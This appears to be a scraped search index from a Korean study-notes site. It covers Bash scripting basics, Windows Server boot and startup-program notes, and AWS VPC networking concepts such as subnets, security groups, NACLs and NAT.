파라미터를 통해 호출된다면 몇 가지 추가적인 변수가 생성되는 데 이를 파라미터 변수라 칭함    $1, $2, $3 \u0026hellip;  Script에 주어진 파라미터       $  환경 변수 IFS의 첫 문자로 구분되고, 하나의 변수에 저장되는 모든 파라미터의 목록       $@  *IFS 환경 변수를 사용하지 않는 $에 대한 변형       예시  $ vi Helli.sh #!/bin/bash IFS=NOT # 환경변수 IFS를 NOT으로 초기화 set H e l l o # 파라미터 설정 echo $@ echo \u0026#34;$@\u0026#34; echo $* echo \u0026#34;$*\u0026#34; unset IFS echo $@ echo $* echo \u0026#34;$@\u0026#34; echo \u0026#34;$*\u0026#34; # 출력 $ chmod +x ./Hello.sh $ ./Hello.sh H e l l o H e l l o H e l l o HNeNlNlNo H e l l o H e l l o H e l l o H e l l o    Shell 조건문   Shell Bool형 확인 기능 [], test   test, []는 어떤 표현식이나 파일에 대해 산술비교 스트링 비교, 파일 조건 등을 확인하고 그에 대해 참 또는 거짓의 값을 리턴하는 역할을 수행.\n  예시\n    [ 기본형 ] $ if test -f fred.c than .... fi [ 축약형 ] $ if [ -f fred.c ] then ... fi    Shell 제어 구조   IF  명령의 결과를 테스트하고 조건부로 구문의 그룹을 실행한다.    if [condition];then \u0026lt;statements\u0026gt; elif [condition];then \u0026lt;statements\u0026gt; else [condition] \u0026lt;statements\u0026gt; fi    예제  $ vi iftime.sh #!/bin/sh echo \u0026#34;Is it morning? Please answer yes or no\u0026#34; read timeofday if [ $timeofday = \u0026#34;yes\u0026#34; ]; then echo \u0026#34;Good moring\u0026#34; elif [ $timeofday = \u0026#34;yes\u0026#34; ]; then echo \u0026#34;Good afternoon\u0026#34; else echo \u0026#34;Error, $timeofday not recognized. Only yes or no\u0026#34; exit 1 fi $ chmod +x iftime.sh $ ./iftime.sh # timeofday가 yes일 경우 Good moring을 출력, no일 경우 Good afternoon을 출력, yes, no 두 경우 아닐경우 error를 출력    For   값의 범위에 대한 반복문 수행\n  값의 범위는 문자열의 집합도 가능\n  모든 Shell 변수가 기본적으로 문자열로 인식되기 때문에, for 반복문은 문자열 집합에 대해 반복문을 수행하기에 편리\n  일반적인 반복문과 다르게 정해진 횟수만큼 명령을 실행할 수 없음\n    for \u0026lt;variable\u0026gt; in \u0026lt;values\u0026gt; do \u0026lt;statements\u0026gt; done    예제  $ vi zoo.sh #!/bin/sh for zoo in tiger pig cat dog do echo $zoo done exit 0 $ chomd +x zoo.sh $ ./zoo.sh tiger pig cat dog # 변수 zoo를 선언하고 그 안에 tiger, pig, cat, dog를 넣어 출력 $ ls -l drwxr-xr-x 2 root root 4096 Aug 23 08:41 ./ drwx------ 6 root root 4096 Aug 23 08:41 ../ -rwx------ 1 root root 193 Aug 23 07:44 Hello.sh* -rwx------ 1 root root 78 Aug 23 07:27 HI.sh* -rwxr-xr-x 1 root root 264 Aug 23 08:33 iftime.sh* -rw-r--r-- 1 root root 150 Aug 23 06:51 lsoutput.txt -rw------- 1 root root 101 Aug 23 07:03 Script.sh -rwx--x--x 1 root root 329 Aug 23 07:47 vitry.sh* -rwxr-xr-x 1 root root 69 Aug 23 08:41 zoo.sh* $ vi Hfor.sh !/bin/sh for list in $(ls H*.sh) do echo $list done exit 0 $ chmod +x ./Hfor.sh $ ./Hfor.sh Hello.sh Hfor.sh HI.sh # for 반복문 안의 ls H*.sh를 참조하여 출력   값으로 $(command)를 이용할 수 있음\n  파일 일므의 공백이 있는 경우에는 정상적으로 동작하지 않음\n     While 구문  for문과 동일한 반복문이지만 while은 결과값이 True일 때까지만 구문을 반복    while \u0026lt;condition\u0026gt; do \u0026lt;statements\u0026gt; done  예시  $ vi password.sh #!/bin/bash echo \u0026#34;Enter password\u0026#34; read pass while [ \u0026#34;$pass\u0026#34; != \u0026#34;ubuntu\u0026#34;]; do echo \u0026#34;Error, try again...\u0026#34; read pass done exit -0 $ chmod +x ./password.sh $ ./password.sh Enter password hello Error, try again... ubuntu # 만약 입력한 pass가 틀린 값일 시 Error를 출력하고 다시 입력하게 출력, 참일 경우 while문을 종료시킴 $ vi count.sh #!/bin/sh num=1 while [ \u0026#34;$num\u0026#34; -le 5 ] do echo \u0026#34;$num\u0026#34; num=$(($num+1)) done exit 0 1 2 3 4 5 $ chmod +x ./count.sh $ ./count.sh # num을 1로 선언하고 만약 num이 5보다 작을 경우 num을 출력하고 num의 +1의 값을 대입    untill 구문        until \u0026lt;condition\u0026gt; do \u0026lt;statements\u0026gt; done   $ vi until2.sh #!/bin/sh until who | grep \u0026#34;$1\u0026#34; \u0026gt; /dev/null do sleep 10 done echo -e \\\\a echo \u0026#34;$1 has just logged in\u0026#34; exit 0     Case 구문        case \u0026lt;variable\u0026gt; in \u0026lt;pattern\u0026gt; | \u0026lt;pattern...\u0026gt; statements;; \u0026lt;pattern\u0026gt; | \u0026lt;pattern...\u0026gt; statements;;   #!/bin/sh echo “Is it morning? Please answer yes or no” read timeofday case “$timeofday” in yes | y | Yes | YES ) echo “Good Morning”;; [nN]* ) echo “Good Afternoon”;; * ) echo “Sorry” exit 1;; esac    Shell List   단순 list  구문 1; 구문 2; 구문 3; \u0026hellip;       AND list  구문 1 \u0026amp;\u0026amp; 구문 2 \u0026amp;\u0026amp; 구문 3 \u0026amp;\u0026amp; \u0026hellip;       OR list  구문 1 || 구문 2 || 구문 3 || \u0026hellip;       Shell 함수   function  fuction_name(){ \u0026lt;statements\u0026gt; }   #!/bin/sh yes_or_no(){ echo “Is Your Name $1?” while true do echo –n “Enter yes or no: ” read X case “$X” in y|Y|yes|Yes|YES) return 0;; n|N|no|No|NO) return 1;; *) echo “Answer yes or no” esac done } echo “Original parameters are $*” if yes_or_no “$1” then echo “Hi $1” else echo “Oh! Sorry” fi exit 0     Break문  반복문에서 빠져나올 수 있는 함수    #!/bin/sh for var in 1 2 3 4 5 6 7 8 9 10 do echo “var is $var.” if [ “$var” = “5” ] then break; fi done echo “Break!” exit 0 ~     ; (콜론명령)  널 명령, true에 대한 별칭으로 조건에 대한 논리 지정       continue  조건에 맞춘 반복문을 단계를 건너뛴다.       echo  문자열과 줄 바꿈 문자를 출력       eval  인자를 실행       Exit n  n의 의미   exit 0 : 성공\n  exit 1 ~ 125: 스크립트에서 사용 가능한 에러 코드\n  exit 126 : 파일이 실행되지 않음\n  exit !27 : 명령이 발견되지 않음\n  exit 128 : Signal 발생\n  exit etc\u0026hellip;: 예약된 코드\n         printf  printf \u0026quot; 형식 문자열 \u0026quot; 매개변수 1 매개변수 2 \u0026hellip; 모니터에 출력하는 명령어       retrun  하나의 숫자 매개변수를 가짐       set  쉘을 위한 마라미터 변수를 설정    "}),a.add({id:81,href:'/docs/system/window/',title:"Windows Servers",content:"Windows Server   Windows Server Training   Windows Sever Roadmap\n  Windows Server Install\n  Windows Sever 부팅 및 종료\n  Windows Server 사용자 계정\n  파일 및 폴더 관리\n  암호화\n  Windows Shell\n  Windows Server 백업과 복구\n  원격접속을 위한 TELNET Server, SSH Server\n  VNC Server\n  SQL Server\n  Windows Web Server IIS, FTP Server\n  Windows Active Directory\n  DHCP Server\n  DNS Server\n  Mail Server\n  Windows 배포 서비스\n  Windows 가상화\n      "}),a.add({id:82,href:'/docs/system/macos/macos03/',title:"Zsh",content:"Zsh   Zsg    ****          "}),a.add({id:83,href:'/docs/system/window/window03/',title:"자동시작, 부팅, 종료",content:"Windows Sever 부팅 및 종료   Windows Server 종료     Windows Server는 대체로 컴퓨터를 종료하는 일이 없으며, 만약 컴퓨터를 종료하거나 재부팅할 때는 왜 종료하는 이유를 선택하거나 입력해주어야 합니다.\n  이전에 종료 및 부팅된 이벤트 기록을 확인하기 위해서는 Windows의 Event Viewer에서 System View로 확인이 가능합니다.\n  이벤트 ID로도 검색이 가능합니다.\n     Windows의 부팅과정    전원\n  POST(Power On Self Test)\n  MBR 읽기\n  BOOTMGR 실행\n  멀티 부팅 선택\n  Windows Loader 실행\n  로그인 화면\n  필수 관리 프로그램 실행\n     안전모드    윈도우 서버 또한 문제가 발생시 안전모드로 진입이 가능합니다.\n  먼저 msconfig를 실행 후, 안전부팅을 설정하여 재부팅합니다.\n       재부팅을 진행하면 다음과 같이 안전모드에 작업을 수행할 수 있습니다.      자동시작 프로그램    부팅되면 자동으로 시작되는 시작 프로그램은 Windows의 시작프로그램에 등록되어져 있습니다.\n  전체 폴더 경로는 C:\\Users\\Administrator\\AppdData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\...입니다.\n  이 외에도 자동으로 숨겨져 있는 파일도 존재합니다.\n     자동시작 프로그램 생성    여기서는 간단한 자동시작 프로그램을 생성해보도록 하겠습니다.\n  먼저 shell;startup을 실행시키고, 대상 폴더에 메모장을 만들어 아무 글이나 적은 후 재부팅합니다.\n       하단의 그림과 같이 자동으로 실행되는 것을 확인 할 수 있습니다.      멀티부팅 설정    멀티부팅이란 윈도우 외에 다른 운영체제도 한 PC안에 설치되어 있는 것을 뜻하며, 우선순위에 따라 실행하는 운영체제를 변경할 수 있습니다.\n  윈도우에서 이에 대한 설정은 시스템 \u0026gt; 고급 시스템 설정 \u0026gt; 고급에서 설정할 수 있습니다.\n     "}),a.add({id:84,href:'/docs/aws/awssaa/saa-4/',title:"4장 VPC",content:"4장 Amazon Virtual Private Cloud   4장의 목표   복원력을 갖춘 아키텍처 설계  어떻게 멀티 티어 아키텍처 솔루션을 설계할지 결정한다.      안전한 어플리케이션 및 아키텍처 설계  단일 VPC 어플리케이션을 위한 네트워킹 인프라르 정의한다. 단일 VPC 애플리케이션을 위한 네트워킹 인프라르 정의한다.       Virtual Private Cloud ( 이하 VPC )    VPC란 EC2의 네트워크 계층으로, EC2 인스턴스를 비롯한 여러 AWS 서비스에 네트워크 리소스를 담을 수 있는 가상의 네트워크를 의미한다.\n  모든 VPC는 기본적으로 다른 모든 네트워크와 격리되어 있지만, 필요할 때는 인터넷 및 다른 VPC와 연결이 가능하다.\n  VPC는 한 리전안에서만 존재할 수 있으며, 한 리전에 만든 VPC는 다른 리전에서는 볼 수 없다.\n  VPC에는 라우터, 스위치, VLAN과 같은 기존 네트워크 구성 요소들이 존재하지 않으며, 확장성을 실현하기 위해 소프트웨어 기능으로 추상화하였다.\n     VPC CIDR 블록    기존 네트워크와 동일하게 VPC는 하나 이상의 연속적인 IP 주소 범위로 구성되며, CIDR ( Classless Inter Domain Routing ) 블록으로 표시된다.\n  VPC 내 인스턴스를 비롯한 리소스에 해당되는 IP 주소는 CIDR 블록으로 결정되며, VPC를 만들 때는 기본 CIDR 블록 주소의 할당이 필수이다.\n  간략한 CIDR 설명\n IP 접두사라는 CIDR 블록의 /16 부분은 접두사의 길이를 의미하며, VPC CIDR 접두사의 길이는 /16부터 /28까지를 의미한다.. CIDR과 IP 주소는 반비레 관계이며 접두사의 길이가 작을 수록 CIDR의 IP 주소는 많아진다. 예를 드면 /28 접두사의 길이는 16개의 IP 주소만이 사용 가능하다.       주소 대역 할당 IP 대역     10.0.0.0 10.255.255.255 ( 10.0.0.0/8 )   172.16.0.0 172.31.255.255 ( 172.16.0.0/12 )   192.168.0.0 192.168.255.255 ( 192.168.0.0/16 )       VPC는 온 프레미스 네트워크나 다른 VPC 등 다른 네트워크에 연결하려면 사용할 VPC CIDR과 다른 네트워크에 연결하려면 주소와 중복되지 않도록 해야 한다.\n  기본 CIDR 블록은 변경할 수 없으므로 VPC를 만들기 전에 주소 요구 사항을 신중히 검토해야 한다.\n     보조 CIDR 블록    VPC를 만든 후에도 보조 CIDR 블록을 지정할 수 있다.\n  보조 CIDR 블록은 기본 CIDR 주소 범위나 퍼블릭 라우팅이 가능한 범위 내에서 생성돼야 하며, 기본 블록 또는 다른 보조 블록과 겹치지 않아야 한다.\n  VPC가 172.16.0.0/16일 경우 172.17.0.0/16으로 지정할 수 있지만, 192.168.0.0/16으로는 지정할 수 없다.\n     IPv6 CIDR 블록    VPC에 IPv6 CIDR을 할당 할 수 있으나, IP 접두사를 지정할 수 있는 기본 CIDR과는 달리 IPv6에서는 CIDR을 지정할 수 없다.\n  AWS에 요청을 하면, AWS가 VPC에 IPv6을 할당한다.\n  IPv6의 VPC CIDR의 접두사의 길이는 항상 /56이다.\n     서브넷    서브넷은 VPC 내 논리 컨테이너로 EC2 인스턴스를 배치하는 장소이다.\n  서브넷으르 통해 인스턴스를 서로 격리하고, 인스턴스 간 트래픽 흐름을 제어하고, 인스턴스를 기능별로 모을 수 있다.\n  인스턴스는 서브넷 안에 있어야 하며, 한 서브넷에 생성된 인스턴스는 다른 서브넷으로 이동이 불가능하다.\n     서브넷 CIDR 블록    서브넷의 CIDR은 VPC CIDR의 일부이면서, VPC 내에서 고유해야 한다.\n  서브넷의 모든 IP의 첫 4개, 끝 1개는 사용할 수 없다.\n 172.16.100.0 ~ 172.16.100.3 127.16.100.255    서브넷 CIDR 접두사의 길이 제한은 VPC CIDR과 동일할 수 있지만, 이리하면 공간이 남지 않기에 보통 서브넷의 CIDR은 VPC보다 길다.\n  VPC는 보조 CIDR을 가질 수 있지만, 서브넷에는 하나의 CIDR만이 사용 가능하다.\n  만약 VPC가 보조 CIDR을 가지고 있을 경우, 서브넷은 적합한 CIDR을 선택해 생성할 수 있다.\n     가용 영역    서브넷은 하나의 가용영역 ( Availability Zone 이하 AZ ) 내에서만 존재할 수 있으며, 가용 영역은 상대적으로 작은 지리적 위치, 데이터 센터의 개념이다.\n  AWS 리전의 가용영역들은 서로 연결되어 있으며, 한 가용 영역에 잘애가 발생하더라도 다른 영역에 장애의 영향이 미치지 않도록 설게되어있다.\n  즉, 서로 다른 가용영역에 서브넷은 만든 후, 인스턴스를 각각 생성하면 애플리케이션은 복원성을 사용가능하다.\n     Subnet AZ Instance     web-subnet1 us-east-1a web1   web-subnet2 us-east-1b web2     위와 같이 만약 us-east-1a의 생성된 web1의 인스턴스의 문제가 발생하더라도, web2 인스턴스의 서브넷은 다른 AZ에 속해있기 때문에 무중단 서비스가 가능하다.     IPv6 CIDR 블록   VPC에 IPv6 CIDR을 할당하면 해당 VPC 내 서브넷에 IPv6 CIDR을 할당할 수 있다. IPv6 서브넷의 접두사 길이는 /64로 고정되어있다.     탄력적 네트워크 인터페이스    탄력적 네트워크 인터페이스 ( Elastic Network Interface 이하 ENI )를 사용하면 인스턴스가 AWS 서비스, 다른 인스턴스, 온 프레미스 서버, 인터넷 등 다른 네트워크의 리소스와 통신할 수 있다.\n  기본적으로 물리 서버의 네트워크 인터페이스와 동일한 기능을 수행한다.\n     기본 프라이빗 주소와 보조 프라이빗 IP 주소    각 인스턴스는 기본 프라이빗 주소를 가지고 있어야 하는 데, 그 주소는 서브넷 CIDR에서 지정한 범위 내 주소여야 한다.\n  기본 프라이빗 IP 주소는 인스턴스의 기본 ENI에 연결되며 이 주소는 변경하거나 삭제가 불가능하다.\n  보조 프라이빗 IP 주소에는 ENI를 할당할 수 있으며, 보조 주소는 ENI가 연결된 서브넷의 주소 내에서 할당된다.\n  ENI를 인스턴스에 추가해서 연결할 수 있고, 이 ENI를 다른 서브넷에 둘 수도 있지만, 해당 인스턴스와 같은 가용 영역에 있어야하며, ENI와 연결된 주소는 ENI가 있는 서브넷에서 가져와야 한다.\n     탄력적 네트워크 인터페이스 연결   ENI는 인스턴스와 독립적으로 존재가 가능하며, 먼저 ENI를 생성한 후 인스턴스를 생성하고 할당할 수 있다.     인터넷 게이트웨이    인터넷 게이트웨이는 퍼블릭 IP 주소를 할당받은 인스턴스가 인터넷과 연결돼서 인터넷으로부터 요청을 수신하는 기능을 수행한다.\n  처음 VPC를 생성하고, VPC에는 인터넷 게이트웨이가 연결되어 있지 않으므로, 직접 인터넷 게이트웨이를 만들어 VPC와 연결해야한다.\n  인터넷 게이트웨이는 인터넷 서비스를 제공하는 업체의 온 프레미스에 설치하는 인터넷 라우터와 유사하지만, AWS에서 인터넷 게이트웨이는 라우터와 동일하게 동작하지는 않는다.\n  기존 네트워크에서는 핵심 라우터의 주소를 인터넷으로 향하는 기본 게이트웨이 IP 주소로 구성해서 각 서버가 인터넷에 엑세스 할 수 있도록 한다.\n  인터넷 게이트 웨이는 관리형 IP나 네트워크 인터페이스가 없는 대신, 식별을 위해 AWS 리소스 ID가 할당된다.\n  인터넷 게이트 웨이는 igw-로 시작하며 그 뒤에는 영 숫자나 문자열이 온다.\n  인터넷 게이트웨이를 사용하려면 인터넷 게이트웨이를 대상으로 하는 기본 라우팅을 라우팅 테이블에 만들어야 한다.\n     라우팅 테이블    VPC는 리소스 형태로 가상 라우터를 구성하지 않음, 소프트웨어 함수로 IP 라우팅을 구현한 내재된 라우터를 제공한다.\n  사용자는 가상 라우터에서 인터페이스 IP 주소나 동적 라우팅 프로토콜을 구성하지 않고 내재된 라우터에서 라우팅 테이블만 관리하면 된다.\n  각 라우팅 테이블은 하나 이상의 라우팅과 하나 이상의 서브넷의 연결로 구성되며, 기존의 라우터와 거의 동일한 방식으로 여러 서브넷에 연결되어 있다.\n  라우팅 테이블과 서브넷은명시적으로 직접 연결하지 않더라도 서브넷에 암시적으로 기본 라우팅 테이블이 연결되므로, 모든 서브넷은 라우팅 테이블으로 연결된다.\n     라우팅    라우팅은 라우팅 테이블과 연결된 서브넷 내 인스턴스에서 트래픽을 저달하는 방법을 결정한다.\n  IP라우팅은 원본 IP 주소가 아닌 대상 IP주소를 기반으로 작동하므로, 하위의 요소는 제공해야 한다.\n 대상 주소 대상    IP 주소는 CIDR 표기법의 IP 접두사여야 하며, 대상에는 CIDR은 사용할 수 없고, 인터넷 게이트웨이, ENI 등의 AWS 리소스가 지정되어야한다.\n  모든 라우팅 테이블에는 각각 다른 서브넷에 있는 인스턴스들이 서로 통신할 수 있게 하는로컬 라우팅이 포함되어 있다.\n     기본 라우팅   인스턴스가 인터넷에 액세스하게 하려면 인터넷 게이트웨이를 가리키는 기본 라우팅을 생성해야 한다.     대상 주소 대상     172.31.0.0/16 LOCAL   0.0.0.0/0 igw-xxxxxxxxx      인터넷 상의 모든 호스트 IP 주소를 표기할 때는 0.0.0.0/0 접두사를 사용하므로, 기본 라우팅 대상 주소로 0.0.0.0/0의 접두사를 등록해야 한다.\n  인터넷 게이트웨이를 가리키는 기본 라우팅이 포함된 라우팅 테이블과 연결된 서브넷을 퍼블릭 서브넷이라 한다.\n  이와 반해서 프라이빗 서브넷은 기본 라우팅을 포함하지 않는다. 0.0.0.0/0과 172.31.0.0/16이 증복되어 있을 때, 트래픽을 라우팅할 위치를 결정할 때 내재된 라우터는 가장 근접하게 일치된 항목을 기반으로 라우팅 한다.\n  AWS docs에서는 VPC 당 내재된 라우터가 하나 존재한다고 기술되어 있으며, 이 라우터란 실제 개별 리소스가 아닌 IP 라우팅 기능을 추상화한 것으로 이해하면 된다.\n     보안 그룹    보안 그룹은 방화벽과 같은 기능을 제공하며, 인스턴스의 ENI의 송수신되는 트래픽을 허가해서 인스턴스를 오가는 트래픽을 제어해야 한다.\n  모든 ENI에는 최소한 하나의 보안 그룹이 연결되어야 하고, 한 ENI에 여러 개의 보안 그룹을 연결할 수 있으며, 한 보안 그룹을 여러 개의 ENI에 연결할 수도 있다.\n  실제 인스턴스는 ENI를 하나만 연결해서 사용하기 땜누에 하나의 인스턴스에 하나의 보안 그룹만이 연결되어 있다고 생각하기 쉬운데, 인스턴스에 ENI가 여러 개 있는 경우에는 반드시 확인이 필요하다.\n     보안 그룹 인바운드 규칙    인바운드 규칙은 연결된 ENI에 허용할 트래픽을 정의하는 것으로 아래의 3 가지의 필수 요소를 포함한다.\n 출발 주소 ( source address ) 프로토콜 포트 범위    새로 생성한 보안 그룹에는 인바운드 규칙이 없으며, 연결한 인스턴스의 모든 트래픽을 차단한다.\n  필요에 따라 특정 트래픽을 허용하려면 그 때마다 인바운드 규칙을 만들어야 하고, 이러한 이유로 보안 그룹에서 규칙의 순서는 중요하지 않다.\n  아래의 항목은 HTTP와 SSH의 예시이다.\n   원본 프로토콜 포트 범위     151.123.231.2 ( 자기자신이 사용하고 있는 특정 IP ) TCP ( SSH ) 22   0.0.0.0/0 ( 모두 접속할 수 있어야 하므로 ) HTTP 80         보안 그룹 아웃바운드 규칙    아웃바운드 규칙은 인스턴스에 연결된 ENI르 통해 송수힐 수 있는 트래픽을 정의한 것으로, 아래의 세가 요소를 포함한다.\n 목적지 주소 프로토콜 포트 범위    보안 그룹의 아웃바운드 규칙은 인바운드 규칙보다 제한이 적으며, 보안 그룹을 생성할 때, AWS는 기본적으로 하단의 표로 모든 프로토콜과 포트가 열려 있는 아웃 바운드 규칙을 생성한다.\n     목적지 주소 프로토콜 포트 범위     0.0.0.0/0 모두 모두       원본과 대상 주소   규칙의 원본이나 대상 주소에 CIDR 또는 보안 그룹의 리소스 ID를 지정할 수 있고, 보안 그룹에 연결된 모든 인스턴스 규칙이 적용된다.     상태 저장 방화벽    보안 그룹은 상태 저장 방화벽 역할을 수행한다.\n  상태 저장이란 보안 그룹이 트래픽을 한 방향으로 전달되도록 허용할 때, 반대 방향의 응답 트래픽을 지능적으로 허용하는 것을 의미한다.\n     기본 보안 그룹    각 VPC엔느 삭제할 수 없는 기본 보안 그룹이 있으며, 필요하면 규칙을 수정할 수 있다.\n  사용자 지정 봉나 그룹을 만들어 대신 사용하는 것도 가능하다.\n     네트워크 엑세스 제어 목록 ( Network Access Contol List : 이하 NACL )    NACL은 원본 또는 대상 주소 CIDR, 프로토콜, 포트를 기반으로 트래픅을 허용하는 인바운드와 아웃바운드 규칙을 포함한다.\n  NACL은 보안 그롭, 방화벽의 기능을 수행하며, 각 VPC에는 삭제할 수 없는 NACL이 있다는 점도 보안 그룹과 유사하다.\n  하지만 NACL은 보안그룹과 달리, ECI가 아닌 서브넷에 연결되며, 서브넷과 연결된 NACL은 해당 서브넷과 송수신되는 트래픽을 제어한다.\n  즉, 서브넷 내의 인스턴스간 트래픽을 제어할 때는 NACL을 사용할 수 없으며, 보안 그룹을 사용해야한다.\n  서브넷은 하나의 NACL만 연결할 수 있으며, VPC에 서브넷을 만들면 기본적으로 VPC의 기본 NACL이 연결된다.\n  서브넷과 NACL이 같은 VPC에 있다면 하나의 NACL을 여러 서브넷에 연결하는 것이 가능하다.\n     NACL 인바운드 규칙    인바운드 규칙은 서브넷에 진입할 수 있는 트래픽을 정의하며, 다음 요소들을 포함한다.\n 규칙 번호 프로토콜 포트 범위 출발 주소 동작 ( 허용/ 거부 )    IPv6 CIDR이 없는 VPC는 기본 NACL에는 표 4.5에 나열된 두 가지 인바운드 규칙이 포함되어있다.\n     규칙번호 프로토콜 포트 범위 출발 주소 허용/ 거부     100 모두 모두 0.0.0.0/0 ALLOW   * 모두 모두 0.0.0.0/0 DENY     NACL 규칙은 규칙 번호의 오름차순으로 처리된다.     NACL 아웃바운드 규칙    아웃바운드 또한 인바운드 규칙과 거의 같은 형식을 따르며, 아래의 요소들을 포함한다.\n 규칙 번호 프로토콜 포트 범위 대상 주소 동작 ( 허용/ 거부 )    각 기본 NACL은 하단에 나열된 아웃바운드 규칙으로 제공되며, 아웃바운드 규칙은 대상 주소를 제외하고는 기본 인바운드 규칙과 동일하다.\n     규칙번호 프로토콜 포트 범위 도착 주소 허용/ 거부     100 모두 모두 0.0.0.0/0 ALLOW   * 모두 모두 0.0.0.0/0 DENY     NACL은 상태 비저장이므로 응답 트래픽을 자동으로 허용하지 않기 때문에, 만약 인바운드에서 HTTPS의 트래픽을 허용한다면, 아웃바운드 규칙에서도 응답 트래픽을 명시적으로 허용해야한다. 기본적으로 최신 운영 체제에서는 49125-65535 범위의 임시 포트를 허용하지만, 이 범위는 충분하지않을 수 있다.     네트워크 엑세스 제어 목록과 보안 그룹을 같이 사용    사용자가 인스턴스를 시작할 때, 보안 그룹을 올바르게 지정해야 하는 부담을 줄이기 위해 보안 그룹과 NACL을 함께 사용할 수 있다.\n  NACL은 서브넷에 적용되므로 NACL 규칙은 보안 그룹 구성 방법과 관계없이 서브넷에서 송수신하는 모든 트래픽에 적용된다.\n  NACL이나 보안 그룹은 규칙을 변경하면 해당 변경 사항이 즉시 적용 ( 실제로는 몇 초 의 시간이 소요 )\n  NACL에서는 원본 또는 대상 주소를 지정해야 CIDR을 사용할 수 있으며, 이는 보안 그룹의 원본이나 대상 주소를 다른 보안 그룹을 지정할 수 있는 보안 그룹 규칙과는 다른 점이다.\n     퍼블릭 IP 주소    퍼블릭 IP주소는 퍼블릭 인터넷으로부터 인스턴스에 엑세스하는 데 필수 요소로 인터넷이 아닌 프라이빗 네트워크 내에서만 통신할 수 있는 RFC 1918 주소와는 다르다 할 수 있다.\n  AWS 외부에서 직접 인터넷을 통해 연결하려면 인스턴스에 퍼블릭 IP 주소가 필요하다.\n  인스턴스에서 인터넷으로 전송만 하는 용도의 퍼블릭 IP 주소를 연결하는 방법도 있지만, 인스턴스 간에는 프라이빗 IP 주소로 통신하기 때문에, VPC 인프라 내에서 인스턴스 간 통신에는 퍼블릭 IP 주소가 필요하지 않다.\n  퍼블릭 주소는 처음에만 할당이 가능하고, 생성 후에는 할당이 불가능하다.\n  사용자가 재시작 하지 않았더라도, AWS 자체 유지보수 기능의 이해 변동 될 수 있다.\n  IP 주소가 바뀌어도 무방한 인스턴스에는 퍼블릭 IP를 사용해도 되지만, 장기간 같은 IP 주소를 유지해야하는 인스턴스에는 탄력적 IP 주소를 사용하는 것이 좋다.\n     탄력적 IP 주소 ( Elastic IP Address : 이하 EIP )    EIP는 AWS에서 사용자의 요청하면 계정에 할당되는 퍼블릭 IP 주소로 계정에 EIP가 할당되면 사용자가 직접 해제하지 않는 한 해당 주소를 독점적으로 사용할 수 있다.\n  AWS 외부에서 보면 EIP와 자동 할당된 퍼블릭 IP 간에는 차이점이 없다.\n  EIP는 인스턴스에 연결되지 않은 상태로 할당된다.\n     네트워크 주소 변환    ENI를 퍼블릭 IP 주소와 연결할 때는 ENI는 프라이빗 IP 주소를 그대로 유지한다.\n  퍼블릭 IP를 ENI와 연결하더라도 ENI가 새로운 주소로 재구성되는 것이 아니며, 인터넷 게이트웨이는 네트워크 주소 변환이라는 프로세스를 활용해 퍼블릭 IP 주소와 ENI 프라이빗 주소를 연결한다.\n  퍼블릭 IP가 있는 인스턴스에서 인터넷의 호스트로 연결하면 그 호스트는 인스턴스의 퍼블릭 IP에 있는 트래픽이 발생한 것으로 간주한다.\n  예를 들면, 퍼블릭 IP가 있는 호스트에 프라이빗 IP 주소에 보내었다 해도 게이트 웨이를 지나 퍼블릭 IP를 통해 접속하게 된다.\n  이 때 게이트웨이는 자동적으로 주소를 변화시키며, 사용자는 개입이 불가능하다.\n     네트워크 주소 변환 장치    네트워크 주소 변환은 인터넷 게이트웨이에서 이루어지지만, 다음 두 가지 서비스도 네트워크 주소변환을 수행한다.\n NAT 게이트웨이 NAT 인스턴스    AWS 서비스 속에서 이는 NAT 디바이스라 하며, 인스턴스가 인터넷에 액세스할 수 있게 되면서 인터넷상의 호스트에서는 인스턴스에 직접 도달하지 못하게 할 때 사용한다.\n  이 기능은 이느턴스가 업데이트 패치를 받거나 데이터를 업로드할 때 인터넷에 연결할 필요는 있지만, 클라이언트 요청에 응답할 필요는 없을 때 유용하다.\n  NAT 디바이스를 사용하면 인스턴스가 액세스 할 필요가 있더라도 퍼블릭 IP 주소를 할당하지 않으므로, 인터넷 상의 호스트가 인스턴스에 직접 액세스하는 것은 불가능하다.\n  NAT 디바이스의 인터페이스는 퍼블릿 서브넷에 위치하면서 퍼블릭 IP가 연결된다.\n  하단은 NAT 디바이스를 사용할 때의 IP 주소 구성이다.\n     이름 서브넷 프라이빗 IP 퍼블릭 IP     EC2-1 Private 10.0.0.10     EC2-2 Private 10.0.0.11     NAT 디바이스 Public 10.0.1.10 18.212.132.21        EC2-1, 2의 외부주소의 인터넷 호스트로 패킷을 전송하면 그 패킷은 먼저 NAT 디바이스로전달되고, NAT 디바이스에서는 아래와 같이 패킷을 변환한다.     원본 패킷의 원본 IP 주소 원본 패킷의 대상 IP 주소 \u0026ndash;\u0026gt; 변환 \u0026ndash;\u0026gt; 변환 패킷의 원본 IP 주소 변환 패킷의 대상 IP 주소     EC2-1 ( 10.0.0.10 ) 외부 주소 \u0026ndash;\u0026gt; 변환 \u0026ndash;\u0026gt; NAT 디바이스 ( 10.0.1.10 ) 외부 주소        내부 대역에서 NAT 디바이스와의 변환을 마치게 되면 하단과 같이 NAT 디바이스와 인터넷 게이트웨이로의 변환이 다시 한번 이루어진다.     원본 패킷의 원본 IP 주소 원본 패킷의 대상 IP 주소 \u0026ndash;\u0026gt; 변환 \u0026ndash;\u0026gt; 변환 패킷의 원본 IP 주소 변환 패킷의 대상 IP 주소     NAT 디바이스 ( 10.0.1.10 ) 외부 주소 \u0026ndash;\u0026gt; 변환 \u0026ndash;\u0026gt; NAT 디바이스 ( 18.212.132.21 ) 외부 주소     이와 같이 여러 인스턴스가 같은 NAT 디바이스를 사용할 수 있으므로 같은 퍼블릭 IP 주소를 공유해서 아웃 바운드에 연결할 수 있다. NAT 디바이스가 수행하는 기능을 포트 주소 변환 ( Port Address Translation : 이하 PAT )이라고 한다.     NAT 디바이스를 사용한 라우팅 테이블 구성    프라이빗 서브넷에서 트래픽이 인터넷으로 전송돼야 하는 경우, 트래픽이 NAT 디바이스를 향하도록 경로가 설정되어 있어야 한다.\n  NAT 디바이스에서 트래픽이 인터넷으로 전송되야 할 경우, 트래픽은 인터넷 게이트웨이로 향하도록 경로가 설정되어야 한다.\n  따라서 NAT 디바이스와 라우팅가 인스턴스의 기본 라우팅은 다르게 구성되어야 하며, 복수의 라우팅 테이블을 사용해야 하므로 이에 따라 서브넷도 분리되어야 한다.\n     서브넷 대상 주소 대상     프라이빗 0.0.0.0/0 NAT 디바이스   퍼블릭 0.0.0.0/0 igw-0e538022a0fddc318     위의 표는 